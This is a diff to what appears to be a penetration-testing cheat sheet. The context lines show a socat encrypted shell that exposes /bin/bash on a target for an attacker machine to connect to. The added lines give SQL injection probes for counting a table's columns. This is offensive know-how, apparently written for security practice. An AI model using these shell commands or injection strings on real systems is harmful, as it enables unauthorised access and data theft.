@@ -1676,6 +1676,9 @@ flush privileges;
 
 # delete user
 drop user 'username'@'IP_here';
+
+# comment
+#
 ```
 
 
@@ -2629,6 +2632,17 @@ cat shell.key shell.crt > shell.pem
 socat OPENSSL-LISTENER:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
 # connect from attacker machine
 socat - OPENSSL:target_IP:443,verify=0
+```
+
+
+
+## SQL
+```
+# determine no. of columns in table : (error - 1) =  no_columns
+' order by increasing_no_here
+
+# return no_here columns
+' LIMIT no_here
 ```
 
 
